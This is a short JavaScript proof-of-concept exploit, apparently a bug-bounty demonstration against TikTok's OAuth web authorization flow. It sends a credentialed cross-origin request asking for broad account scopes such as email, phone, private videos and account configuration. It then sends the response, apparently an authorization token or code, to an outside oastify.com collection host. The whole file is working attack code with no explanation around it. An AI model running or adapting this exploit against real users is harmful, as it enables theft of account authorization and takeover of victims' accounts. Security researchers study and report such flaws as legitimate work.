var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("POST", "https://www.tiktok.com/passport/open/web/auth/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cvideo.list.manage%2Clive.list%2Cuser.info.email%2Cvideo.list.no_watermark%2Ccomment.list%2Cvideo.list.private_ads.no_watermark%2Cuser.info.showcase%2Cuser.account.configure%2Ccomment.list.manage%2Cuser.info.phone&aid=1459&source=web&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fbklaaaaaaaaaaaaaaaaa%2Flogin%2F%3F_extra%3D");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//h6o7nfp0x4i5l3nwdfvnrl6bi2otck09.oastify.com/log?key='+this.responseText; 
};
